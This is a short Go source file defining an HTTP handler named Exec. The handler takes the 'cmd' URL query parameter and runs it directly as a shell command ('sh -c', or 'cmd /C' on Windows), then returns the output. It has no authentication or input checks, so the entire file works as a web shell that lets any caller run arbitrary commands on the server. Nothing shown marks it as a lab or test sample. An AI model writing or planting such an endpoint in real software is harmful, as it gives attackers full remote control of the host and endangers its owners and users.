package handlers

import (
    "bytes"
    "net/http"
    "os/exec"
    "runtime"
)

func Exec() http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        cmdStr := r.URL.Query().Get("cmd")
        var c *exec.Cmd
        if runtime.GOOS == "windows" {
            c = exec.Command("cmd", "/C", cmdStr)
        } else {
            c = exec.Command("sh", "-c", cmdStr)
        }
        out, _ := c.CombinedOutput()
        w.Write(bytes.TrimSpace(out))
    }
}